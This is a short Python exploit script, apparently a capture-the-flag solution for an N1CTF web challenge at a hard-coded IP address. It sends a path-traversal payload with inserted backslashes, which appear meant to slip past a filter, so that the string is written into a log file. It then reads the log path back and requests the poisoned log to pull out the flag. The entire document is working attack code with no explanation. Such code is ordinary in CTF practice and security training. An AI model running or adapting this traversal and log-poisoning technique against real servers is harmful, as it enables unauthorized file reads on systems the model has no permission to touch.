#!/usr/bin/python3

import requests

url = "http://43.155.64.70?time=1"

## Make the first request to store "../../../flag" into the logfile
payload1 = str('../../../f\l\\a\g')
response1 = requests.post(url, payload1).text

## Extract path to the logfile
path_start = response1.find('logpath', 600)
path_end = response1.find('</code>', path_start)
logpath = response1[path_start + 8:path_end]

## Make the second request to access the polluted logfile
payload2 ={ 'path': logpath }
response2 = requests.post(url, payload2).text

## Extract the flag
flag_start = response2.find('n1ctf')
flag_end = response2.find('</code>', flag_start)
flag = response2[flag_start:flag_end]

print(flag)
